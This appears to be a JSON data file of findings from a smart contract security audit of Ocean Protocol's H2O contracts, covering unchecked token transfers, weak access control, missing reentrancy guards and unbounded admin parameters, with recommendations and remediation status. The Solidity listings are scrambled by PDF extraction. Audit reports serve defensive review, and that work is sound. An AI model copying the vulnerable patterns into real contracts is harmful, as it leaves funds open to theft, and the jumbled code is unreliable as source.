Plan: SOLVED: The H2O team solved the above issue in the following commits - b6cc5edc266b78a48a1f1f09bd9d229a73619c50 - 3a3ed51516b53d8ed16b703e07452f8edfb5019b - eafcca39e12a33db609bc2a371275fd809e68815 As a result, the team added the additional validation and now uses latestRoundData. 24 ", "labels": ["Halborn", "OceanProtocol_Priority_H2O_System_Action", "Severity: Medium"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "the contracts GebProxyActions.sol, GebProxyIncentivesActions.sol, GebProxyAuctionActions. In sol, GebProxyLeverageActions.sol, GebProxySaviourActions.sol, the return values of the external transfer calls are not checked. It should be noted that token does not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location: Listing 4: GebProxyActions.sol (Line 149) 147 function coinJoin_join ( address apt , address safeHandler , uint  wad ) public { 148 149 // Gets COIN from the user 's wallet CoinJoinLike ( apt ). systemCoin () . transferFrom ( msg . sender ,  address ( this ) , wad ); 150 151 152 } _coinJoin_join ( apt , safeHandler , wad ); Listing 5: GebProxyAuctionActions.sol (Line 63) 61 62 63  ; 64 function claimProxyFunds ( address tokenAddress ) public { DSTokenLike token = DSTokenLike ( tokenAddress ); token . transfer ( msg . sender , token . balanceOf ( address ( this ))) } Listing 6: GebProxyAuctionActions.sol (Line 286) 278 function settleAuction ( address auctionHouse_ , uint auctionId )  public { 25 279 SurplusAuctionHouseLike auctionHouse =  SurplusAuctionHouseLike ( auctionHouse_ ); 280 DSTokenLike stakedToken = DSTokenLike ( auctionHouse .  stakedToken () ); 281 282 283 284 285 286 // Settle auction auctionHouse . settleAuction ( auctionId ); // Sends the staked tokens to the msg . sender stakedToken . transfer ( msg . sender , stakedToken . balanceOf (  address ( this ))); 287 } Listing 7: GebProxyIncentivesActions.sol (Line 463) 458 function exitAndRemoveLiquidity ( address coinJoin , address  incentives , address uniswapRouter , uint [2] calldata  minTokenAmounts ) external returns ( uint amountA , uint amountB ) { 459 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 460 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 461 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 462 463 incentivesContract . exit () ; rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 464 return _removeLiquidityUniswap ( uniswapRouter , address (  CoinJoinLike ( coinJoin ). systemCoin () ) , lpToken . balanceOf ( address (  this )) , msg . sender , minTokenAmounts ); 465 } Listing 8: GebProxyIncentivesActions.sol (Lines 355,356) 350 351 function exitMine ( address incentives ) external { GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 352 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 353 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 354 incentivesContract . exit () ; 26 355 rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 356 lpToken . transfer ( msg . sender , lpToken . balanceOf ( address (  this ))); 357 } Listing 9: GebProxyIncentivesActions.sol (Line 481) 474 function exitRemoveLiquidityRepayDebt ( address manager , address  coinJoin , uint safe , address incentives , address uniswapRouter ,  uint [2] calldata minTokenAmounts ) external { 475 476 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 477 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 478 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 479 DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 480 481 incentivesContract . exit () ; rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 482 483 _removeLiquidityUniswap ( uniswapRouter , address ( systemCoin )  , lpToken . balanceOf ( address ( this )) , address ( this ) , minTokenAmounts  ); 484 485 _repayDebt ( manager , coinJoin , safe , systemCoin . balanceOf (  address ( this )) , false ); 486 487 } msg . sender . call { value : address ( this ). balance }( \"\" ); Listing 10: GebProxyIncentivesActions.sol (Line 336) 319 320 321 322 323 324 325 326 function generateDebtAndProvideLiquidityStake ( address manager , address taxCollector , address coinJoin , address uniswapRouter , address incentives , uint safe , uint wad , 27 327 328 329 uint [2] calldata minTokenAmounts ) external payable { DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 330 _generateDebt ( manager , taxCollector , coinJoin , safe , wad ,  address ( this )); 331 _provideLiquidityUniswap ( coinJoin , uniswapRouter , wad , msg  . value , address ( this ) , minTokenAmounts ); 332 333 334 _stakeInMine ( incentives ); // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 335 336 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 337 } Listing 11: GebProxyIncentivesActions.sol (Line 300) 284 285 286 287 288 289 290 291 292 293 function generateDebtAndProvideLiquidityUniswap ( address manager , address taxCollector , address coinJoin , address uniswapRouter , uint safe , uint wad , uint [2] calldata minTokenAmounts ) external payable { DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 294 _generateDebt ( manager , taxCollector , coinJoin , safe , wad ,  address ( this )); 295 296 _provideLiquidityUniswap ( coinJoin , uniswapRouter , wad , msg  . value , msg . sender , minTokenAmounts ); 297 298 // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 299 300 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 301 } 28 Listing 12: GebProxyIncentivesActions.sol (Line 345) 341 342 function getRewards ( address incentives ) public { GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 343 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 344 345 incentivesContract . getReward () ; rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 346 } Listing 13: GebProxyIncentivesActions.sol (Line 235) 211 212 213 214 215 216 217 218 219 220 221 222 223 function lockETHGenerateDebtProvideLiquidityStake ( address manager , address taxCollector , address ethJoin , address coinJoin , address uniswapRouter , address incentives , uint safe , uint deltaWad , uint liquidityWad , uint [2] memory minTokenAmounts ) public payable { DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 224 225 _lockETH ( manager , ethJoin , safe , subtract ( msg . value ,  liquidityWad )); 226 227 _generateDebt ( manager , taxCollector , coinJoin , safe ,  deltaWad , address ( this )) ; 228 229 _provideLiquidityUniswap ( coinJoin , uniswapRouter , deltaWad  , liquidityWad , address ( this ) , minTokenAmounts ); 230 231 232 233 _stakeInMine ( incentives ); // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 234 msg . sender . call { value : address ( this ). balance }( \"\" ); 29 235 systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 236 } Listing 14: GebProxyIncentivesActions.sol (Line 158) 137 138 139 140 141 142 143 144 145 146 147 148 function lockETHGenerateDebtProvideLiquidityUniswap ( address manager , address taxCollector , address ethJoin , address coinJoin , address uniswapRouter , uint safe , uint deltaWad , uint liquidityWad , uint [2] calldata minTokenAmounts ) external payable { DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 149 150 _lockETH ( manager , ethJoin , safe , subtract ( msg . value ,  liquidityWad )); 151 152 _generateDebt ( manager , taxCollector , coinJoin , safe ,  deltaWad , address ( this )) ; 153 154 _provideLiquidityUniswap ( coinJoin , uniswapRouter , deltaWad  , liquidityWad , msg . sender , minTokenAmounts ); 155 156 // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 157 158 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 159 } Listing 15: GebProxyIncentivesActions.sol (Line 372) 362 function migrateCampaign ( address _oldIncentives , address  _newIncentives ) external { 363 GebIncentivesLike incentives = GebIncentivesLike (  _oldIncentives ); 30 364 GebIncentivesLike newIncentives = GebIncentivesLike (  _newIncentives ); 365 require ( incentives . stakingToken () == newIncentives .  stakingToken () , \" geb - incentives / mismatched - staking - tokens \"); 366 DSTokenLike rewardToken = DSTokenLike ( incentives .  rewardsToken () ); 367 DSTokenLike lpToken = DSTokenLike ( incentives . stakingToken  () ); 368 369 370 371 372 incentives . exit () ; _stakeInMine ( _newIncentives ); rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 373 } Listing 16: GebProxyIncentivesActions.sol (Line 197) 172 173 174 175 176 177 178 179 180 181 182 183 184 185 function openLockETHGenerateDebtProvideLiquidityStake ( address manager , address taxCollector , address ethJoin , address coinJoin , address uniswapRouter , address incentives , bytes32 collateralType , uint256 deltaWad , uint256 liquidityWad , uint256 [2] calldata minTokenAmounts ) external payable returns ( uint safe ) { safe = openSAFE ( manager , collateralType , address ( this )); DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 186 187 _lockETH ( manager , ethJoin , safe , subtract ( msg . value ,  liquidityWad )); 188 189 _generateDebt ( manager , taxCollector , coinJoin , safe ,  deltaWad , address ( this )) ; 190 191 _provideLiquidityUniswap ( coinJoin , uniswapRouter , deltaWad  , liquidityWad , address ( this ) , minTokenAmounts ); 192 193 _stakeInMine ( incentives ); 31 194 195 // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 196 197 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 198 } Listing 17: GebProxyIncentivesActions.sol (Line 124) 102 103 104 105 106 107 108 109 110 111 112 113 114 function openLockETHGenerateDebtProvideLiquidityUniswap ( address manager , address taxCollector , address ethJoin , address coinJoin , address uniswapRouter , bytes32 collateralType , uint deltaWad , uint liquidityWad , uint [2] calldata minTokenAmounts ) external payable returns ( uint safe ) { safe = openSAFE ( manager , collateralType , address ( this )); DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 115 116 _lockETH ( manager , ethJoin , safe , subtract ( msg . value ,  liquidityWad )); 117 118 _generateDebt ( manager , taxCollector , coinJoin , safe ,  deltaWad , address ( this )) ; 119 120 _provideLiquidityUniswap ( coinJoin , uniswapRouter , deltaWad  , liquidityWad , msg . sender , minTokenAmounts ); 121 122 // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 123 124 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 125 } 32 Listing 18: GebProxyIncentivesActions.sol (Lines 266,273) 258 259 260 261 262 263 264 265 function provideLiquidityStake ( address coinJoin , address uniswapRouter , address incentives , uint wad , uint [2] memory minTokenAmounts ) public payable { DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 266 267 systemCoin . transferFrom ( msg . sender , address ( this ) , wad ); _provideLiquidityUniswap ( coinJoin , uniswapRouter , wad , msg  . value , address ( this ) , minTokenAmounts ); 268 269 270 271 _stakeInMine ( incentives ); // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 272 273 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 274 } Listing 19: GebProxyIncentivesActions.sol (Lines 245,250) 243 function provideLiquidityUniswap ( address coinJoin , address  uniswapRouter , uint wad , uint [2] calldata minTokenAmounts )  external payable { 244 DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 245 246 systemCoin . transferFrom ( msg . sender , address ( this ) , wad ); _provideLiquidityUniswap ( coinJoin , uniswapRouter , wad , msg  . value , msg . sender , minTokenAmounts ); 247 248 // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 249 250 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 251 } 33 Listing 20: GebProxyIncentivesActions.sol (Line 419) 418 function removeLiquidityUniswap ( address uniswapRouter , address  systemCoin , uint value , uint [2] calldata minTokenAmounts )  external returns ( uint amountA , uint amountB ) { 419 DSTokenLike ( getWethPair ( uniswapRouter , systemCoin )) .  transferFrom ( msg . sender , address ( this ) , value ); 420 return _removeLiquidityUniswap ( uniswapRouter , systemCoin ,  value , msg . sender , minTokenAmounts ); 421 } Listing 21: GebProxyIncentivesActions.sol (Line 307) 306 307 function stakeInMine ( address incentives , uint wad ) external { DSTokenLike ( GebIncentivesLike ( incentives ). stakingToken () ).  transferFrom ( msg . sender , address ( this ) , wad ); _stakeInMine ( incentives ); 308 309 } Listing 22: GebProxyIncentivesActions.sol (Line 394) 388 function withdrawAndHarvest ( address incentives , uint value )  external { 389 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 390 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 391 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 392 393 394 incentivesContract . withdraw ( value ); getRewards ( incentives ); lpToken . transfer ( msg . sender , lpToken . balanceOf ( address (  this ))); 395 } Listing 23: GebProxyIncentivesActions.sol (Line 382) 378 function withdrawFromMine ( address incentives , uint value )  external { 379 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 34 380 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 381 382 incentivesContract . withdraw ( value ); lpToken . transfer ( msg . sender , lpToken . balanceOf ( address (  this ))); 383 } Listing 24: GebProxyIncentivesActions.sol (Line 409) 403 function withdrawHarvestRemoveLiquidity ( address incentives ,  address uniswapRouter , address systemCoin , uint value , uint [2]  memory minTokenAmounts ) public returns ( uint amountA , uint amountB  ) { 404 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 405 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 406 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 407 408 409 incentivesContract . withdraw ( value ); getRewards ( incentives ); rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 410 return _removeLiquidityUniswap ( uniswapRouter , systemCoin ,  lpToken . balanceOf ( address ( this )) , msg . sender , minTokenAmounts ); 411 } Listing 25: GebProxyIncentivesActions.sol (Line 449) 441 function withdrawRemoveLiquidityRepayDebt ( address manager ,  address coinJoin , uint safe , address incentives , uint value ,  address uniswapRouter , uint [2] calldata minTokenAmounts ) external  { 442 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 443 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 444 DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 445 446 447 incentivesContract . withdraw ( value ); _removeLiquidityUniswap ( uniswapRouter , address ( systemCoin )  , value , address ( this ) , minTokenAmounts ); 35 448 _repayDebt ( manager , coinJoin , safe , systemCoin . balanceOf (  address ( this )) , false ); 449 rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 450 451 } msg . sender . call { value : address ( this ). balance }( \"\" ); Listing 26: GebProxyLeverageActions.sol (Line 44) function uniswapV2Call ( address _sender , uint _amount0 , uint require ( _sender == proxy , \" invalid sender \"); require ( msg . sender == uniswapPair , \" invalid uniswap pair \" ) // transfer coins ( address _tokenBorrow ,, ,,,, , address _proxy ) = abi . decode ( 38  _amount1 , bytes calldata _data ) external { 39 40  ; 41 42 43  _data , ( address , uint , address , bool , bool , bytes , address ,  address )); 44  _amount0 : _amount1 ); 45 46 47  execute ( address , bytes ) \" , _proxy , msg . data )) ; 48 49 // call proxy ( bool success ,) = proxy . call ( abi . encodeWithSignature (\" DSTokenLike ( _tokenBorrow ). transfer ( proxy , ( _amount0 > 0) ? require ( success , \" \"); } Listing 27: GebProxyLeverageActions.sol (Line 151) 113 function uniswapV2Call ( address _sender , uint /* _amount0 */ ,  uint /* _amount1 */ , bytes calldata _data ) external { 114 require ( _sender == address ( this ) , \" only this contract may  initiate \" ); 115  ); 116 117 118 119 120 121 122 DSAuth ( address ( this )) . setAuthority ( DSAuthority ( address (0) ) // decode data ( address _tokenBorrow , uint _amount , address _tokenPay , bool _isBorrowingEth , 36 123 124 125 126 127 bool _isPayingEth , bytes memory _userData , address weth , // address proxy ) = abi . decode ( _data , ( address , uint , address , bool , bool ,  bytes , address , address )) ; 128 129 130 131 132 133 134 135 // unwrap WETH if necessary if ( _isBorrowingEth ) { WethLike ( weth ). withdraw ( _amount ); } // compute the amount of _tokenPay that needs to be repaid // address pairAddress = permissionedPairAddress ; // gas  efficiency 136 uint pairBalanceTokenBorrow = DSTokenLike ( _tokenBorrow ).  balanceOf ( FlashSwapProxy ( msg . sender ). uniswapPair () ); 137 uint pairBalanceTokenPay = DSTokenLike ( _tokenPay ).  balanceOf ( FlashSwapProxy ( msg . sender ). uniswapPair () ); 138 uint amountToRepay = ((1000 * pairBalanceTokenPay *  _amount ) / (997 * pairBalanceTokenBorrow )) + 1; 139 140 141 142 // do whatever the user wants if ( _isBorrowingEth ) flashLeverageCallback ( _amount , amountToRepay ,  _userData ); 143 144 else  _userData ); flashDeleverageCallback ( _amount , amountToRepay , 145 146 147 148 149 150 151 // payback loan // wrap ETH if necessary if ( _isPayingEth ) { WethLike ( weth ). deposit { value : amountToRepay }() ; } DSTokenLike ( _tokenPay ). transfer ( FlashSwapProxy ( msg . sender )  . uniswapPair () , amountToRepay ); 152 } Listing 28: GebProxySaviourActions.sol (Line 45) function transferTokenFromAndApprove ( address token , address 44  target , uint256 amount ) internal { 37 45  amount ); 46 47 48 } DSTokenLike ( token ). transferFrom ( msg . sender , address ( this ) , DSTokenLike ( token ). approve ( target , 0) ; DSTokenLike ( token ). approve ( target , amount ); Listing 29: GebProxySaviourActions.sol (Line 59) function transferTokensToCaller ( address [] memory tokens ) for ( uint i = 0; i < tokens . length ; i ++) { uint256 selfBalance = DSTokenLike ( tokens [ i ]) . balanceOf if ( selfBalance > 0) { DSTokenLike ( tokens [i ]) . transfer ( msg . sender , 55  public { 56 57  ( address ( this )); 58 59  selfBalance ); 60 } 61 62 } } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use SafeERC20, or ensure that the transfer return value is checked. Remediation Plan: RISK ACCEPTED: The H2O team accepts the risk of this issue, claiming that all tokens in the system, i.e., the OCEAN collateral token, the stable coin and the g", "labels": ["Halborn", "OceanProtocol_Priority_H2O_System_Action", "Severity: Medium"]}, {"title": "IMPROPER ACCESS CONTROL POLICY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Implementing a valid Access Control policy in smart contracts is es- sential to maintain security and decentralize permissions on a token. Moreover, access Control gives the features to mint/burn tokens and pause contracts. For instance, Ownership is the most common form of Access Con- trol. In other words, the owner of a contract (the account that deployed Nevertheless, it by default) can do some administrative tasks on it. different authorization levels are required to keep the principle of least privilege, also known as least authority. Briefly, any process, user, or program can only access the necessary resources or information. Otherwise, the ownership role is beneficial in simple systems, but more complex projects require more roles using Role-based access control. In most scope contracts, The authorizedAccounts of the contract are the accounts that control all privileged functions. Everything is managed and controlled by the Authorized accounts, with no other access control. If this account is compromised, then all functionalities would be controlled by an attacker, such as removing all other authorized accounts, changing price source to a malicious address, restarting feed and setting it to 0, starting and stopping the DSM OSM, etc. Code Location: Listing 30: In-Scope Contracts 1 2 constructor ( address priceSource_ ) public { authorizedAccounts [ msg . sender ] = 1; Listing 31: In-Scope Contracts 1 2 constructor ( address priceSource_ , uint256 deviation ) public { require ( deviation > 0 && deviation < WAD , \" DSM / invalid - 39  deviation \"); 3 4 authorizedAccounts [ msg . sender ] = 1; Risk Level: Likelihood - 2 Impact - 4 Recommendation: Its recommended to use role-based access control based on the principle of least privilege to lock permissioned functions using different roles. For example, use authorized account to manage permission only, where it could use other roles to manage other critical functionalities such as DSM OSM role to start, stop DSM OSM, etc. References: Least Privilege OpenZeppelin Access Control Remediation Plan: PENDING: The team will fix the issue in a future release adding the below points. - In case externally owned accounts (EOAs) are the authorized accounts, the team will implement RBAC according to the software engineering princi- ple of separation of concerns by authorizing only a single proxy contract and implementing RBAC in the proxy contract configuration. For example, the DSRoles proxy contract implements permissions at an address method signature level. - In other cases, if a smart contract is the authorized account; the team will only authorize smart contracts for which the code is known and trusted in advance. 40 ", "labels": ["Halborn", "OceanProtocol_Priority_H2O_System_Action", "Severity: Medium"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was identified that some in-scope contracts of H2O branch are miss- ing nonReentrant guard. In these function, write of persistent state and external calls following an external call is identified, making it vulnerable to a Reentrancy attack.  DebtCeilingProposal.sol contract function executeProposal missing nonReentrant guard.  GlobalAuctionParamsProposal.sol contract function executeProposal missing nonReentrant guard.  GlobalSettlementProposal.sol missing nonReentrant guard. contract function executeProposal To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location:  state change executed = true following an external call pause. executeTransaction Listing 32: DebtCeilingProposal.sol (Lines 70,72) function executeProposal () public { // exec require (! executed , \" proposal - already - executed \" ); 67 68 69 70  earliestExecutionTime ); pause . executeTransaction ( target , codeHash , signature , 41 71 72 73 } executed = true ; Listing 33: GlobalAuctionParamsProposal.sol (Lines 86,94,96) function executeProposal () public { require (! executed , \" proposal - already - executed \" ); bytes memory signature = abi . encodeWithSignature ( \" modifyParameters ( address , bytes32 , uint256 )\" , accountingEngine , bytes32 (\" initialDebtAuctionMintedTokens \" ) , initialDebtMintedTokens ); pause . executeTransaction ( target , codeHash , signature , signature = abi . encodeWithSignature ( \" modifyParameters ( address , bytes32 , uint256 )\" , accountingEngine , bytes32 (\" debtAuctionBidSize \") , debtAuctionBidSize ); pause . executeTransaction ( target , codeHash , signature , 76 77 78 79 80 81 82 83 84 85 86  earliestExecutionTime ); 87 88 89 90 91 92 93 94  earliestExecutionTime ); 95 96 97 } executed = true ; 57 58 59 60 61  globalSettlement ); 62 63  earliestExecutionTime ); 64 Listing 34: GlobalSettlementProposal.sol (Lines 63,65) function executeProposal () public { require (! executed , \" proposal - already - executed \" ); bytes memory signature = abi . encodeWithSignature ( \" shutdownSystem ( address )\" , pause . executeTransaction ( target , codeHash , signature , 42 65 66 } executed = true ; Risk Level: Likelihood - 3 Impact - 3 Recommendation: Change the code to follow the checks-effects-interactions pattern and use ReentrancyGuard through the nonReentrant modifier. Remediation Plan: the in result, the The H2O team SOLVED: 384b866ebf808831d3f5980f4f4f62dc17d9365d. added the nonReentrant modifier. solved the above issue a As commit team 43 ", "labels": ["Halborn", "OceanProtocol_Priority_H2O_System_Action", "Severity: Medium"]}, {"title": "AUTHORIZE ACCOUNT CAN SET INVALID BASE AND MAX REWARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the scope contract FSMWrapper.sol, OSM.sol and DSM.sol, it is observed that the authorize accounts can set max and base rewards to an invalid value such as 0. It is possible, as no minimum and maximum value validation on the state variable baseUpdateCallerReward and maxUpdateCallerReward is performed. Code Location:  Authorize accounts calling modifyParameters with byte32 value of baseUpdateCallerReward as a parameter and val as 0 sets baseUpdateCallerReward to 0. After this, call modifyParameters with byte32 value of maxUpdateCallerReward as a parameter and val as 0 sets maxUpdateCallerReward to 0. Listing 35: FSMWrapper.sol, OSM.sol and DSM.sol function modifyParameters ( bytes32 parameter , uint256 val ) 1  external isAuthorized { 2 3  invalid - base - caller - reward \"); 4 5 6 7  invalid - max - caller - reward \" ); 8 9 } if ( parameter == \" baseUpdateCallerReward \" ) { require ( val <= maxUpdateCallerReward , \" FSMWrapper / baseUpdateCallerReward = val ; } else if ( parameter == \" maxUpdateCallerReward \" ) { require ( val >= baseUpdateCallerReward , \" FSMWrapper / maxUpdateCallerReward = val ; 44 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider declaring a state variable that can store baseUpdateCallerReward and maxUpdateCallerReward rewards minimum and maximum value. Add the require check to make sure supplied val for baseUpdateCallerReward and maxUpdateCallerReward parameter lies within the min and max value. Remediation Plan: RISK ACCEPTED: The H2O team accepts the risk of this issue, claiming that for the above issue, in case the delay is set incorrectly, you can use the same function call to set it to a correct value. Additionally, the team can add an extra layer by including a multisig system. 45 ", "labels": ["Halborn", "OceanProtocol_Priority_H2O_System_Action", "Severity: Low"]}, {"title": "AUTHORIZE ACCOUNT CAN INCREASE MAX REWARD DELAY TO MAX INT VALUE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the scope contract FSMWrapper.sol, OSM.sol and DSM.sol, it is observed that the authorize accounts can set max reward increase delay to a vast number, as val is a type of uint256 a max value 2^256-1 could be supplied as an argument which ends up setting the state variable maxRewardIncreaseDelay to max INT value, this sets max reward not to increase for years. Code Location:  Authorize accounts calling modifyParameters with byte32 value of maxRewardIncreaseDelay as a parameter and val as 2^256-1 sets maxRewardIncreaseDelay to max INT value. Listing 36: FSMWrapper.sol, OSM.sol and DSM.sol (Lines 14-17) function modifyParameters ( bytes32 parameter , uint256 val ) 1  external isAuthorized { 2 3  invalid - base - caller - reward \"); 4 5 6 7  invalid - max - caller - reward \" ); 8 9 10 11  increase \" ); 12 13 } if ( parameter == \" baseUpdateCallerReward \" ) { require ( val <= maxUpdateCallerReward , \" FSMWrapper / baseUpdateCallerReward = val ; } else if ( parameter == \" maxUpdateCallerReward \" ) { require ( val >= baseUpdateCallerReward , \" FSMWrapper / maxUpdateCallerReward = val ; } else if ( parameter == \" perSecondCallerRewardIncrease \") { require ( val >= RAY , \" FSMWrapper / invalid - caller - reward - perSecondCallerRewardIncrease = val ; 46 14 15  ); 16 17 18 19 20 21 22 23 24 25 26 else if ( parameter == \" maxRewardIncreaseDelay \" ) { require ( val > 0, \" FSMWrapper / invalid - max - increase - delay \" maxRewardIncreaseDelay = val ; } else if ( parameter == \" reimburseDelay \" ) { reimburseDelay = val ; } else revert ( \" FSMWrapper / modify - unrecognized - param \"); emit ModifyParameters ( parameter , val ); } Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to set a maximum value of maxRewardIncreaseDelay and add a require check that validates val is always less than or equal to max value of maxRewardIncreaseDelay such as require( 0 < val <= maxDelayLimit , \"FSMWrapper/invalid-max-increase-delay\");. Remediation Plan: RISK ACCEPTED: The H2O team accepts the risk of this issue, claiming that for the above issue, in case the delay is set incorrectly, you can use the same function call to set it to a correct value. Additionally, the team can add an extra layer by including a multisig system. 47 ", "labels": ["Halborn", "OceanProtocol_Priority_H2O_System_Action", "Severity: Low"]}, {"title": "THE CONTRACT FUNCTION SHOULD APPROVE(0", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Some tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero, and then the actual allowance must be approved. Listing 37 1 IERC20 ( token ). approve ( address ( operator ) , 0) ; 2 IERC20 ( token ). approve ( address ( operator ) , amount ); Code Location: Listing 38: GebProxyIncentivesActions.sol (Line 81) return IUniswapV2Router02 ( uniswapRouter ). DSTokenLike ( getWethPair ( uniswapRouter , systemCoin )) . function _removeLiquidityUniswap ( address uniswapRouter , 80  address systemCoin , uint value , address to , uint [2] memory  minTokenAmounts ) internal returns ( uint amountA , uint amountB ) { 81  approve ( uniswapRouter , value ); 82  removeLiquidityETH ( 83 84 85 86 87 88 89 90 systemCoin , value , minTokenAmounts [0] , minTokenAmounts [1] , to , block . timestamp ); } Listing 39: GebProxyIncentivesActions.sol (Line 70) function _stakeInMine ( address incentives ) internal { DSTokenLike lpToken = DSTokenLike ( GebIncentivesLike ( 68 69  incentives ). stakingToken () ); 48 lpToken . approve ( incentives , uint (0 - 1) ); GebIncentivesLike ( incentives ). stake ( lpToken . balanceOf ( 70 71  address ( this ))); 72 } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Approve with a zero amount first before setting the actual amount. Remediation Plan: RISK ACCEPTED: The H2O team accepts the risk of this issue, claiming that the issue will not be triggered as Uniswap LP tokens will be used in production. Moreover, the team will add documentation to warn downstream users using the H2O system only with tokens that do not exhibit this behavior in their approve functions. 49 ", "labels": ["Halborn", "OceanProtocol_Priority_H2O_System_Action", "Severity: Low"]}, {"title": "ERC20 APPROVE METHOD MISSING RETURN VALUE CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The following contract functions perform an ERC20.approve() call, but does not check the success return value. Some tokens do not revert if the approval failed and return false instead of true. Code Location: Listing 40: GebProxyActions.sol (Line 192) 187 function increaseBidSize ( address auctionHouse , uint auctionId ,  uint bidSize ) public { 188 SurplusAuctionHouseLike surplusAuctionHouse =  